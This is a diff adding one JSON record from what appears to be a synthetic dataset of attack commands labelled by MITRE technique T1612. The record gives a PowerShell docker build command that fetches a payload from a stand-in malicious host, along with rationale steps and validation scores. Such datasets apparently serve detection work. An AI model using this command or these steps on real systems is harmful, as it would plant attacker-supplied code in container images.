@@ -1,0 +1,31 @@
+{
+  "technique_id": "T1612",
+  "platform": "windows",
+  "shell": "powershell",
+  "command": "docker build -t hidden_payload --build-arg URL=https://malicious.com/payload.exe -f Dockerfile .",
+  "explanation": "The command creates a Docker image that fetches a malicious payload from an external source via build arguments.",
+  "rationale_steps": [
+    "Include a command in the Dockerfile to download an external payload using the URL passed as a build argument.",
+    "Build the Docker image with the specified tag including the malicious payload."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1612-20543000-07aeafb6",
+  "source_prompt_hash": "20543000",
+  "timestamp_utc": "2025-07-10T23:25:25.071058Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": true,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 4.68,
+      "command_length": 96
+    },
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "forbidden_tokens": true,
+    "obfuscation_suspicious": false,
+    "obfuscation_entropy": 4.68,
+    "command_length": 96
+  }
+}
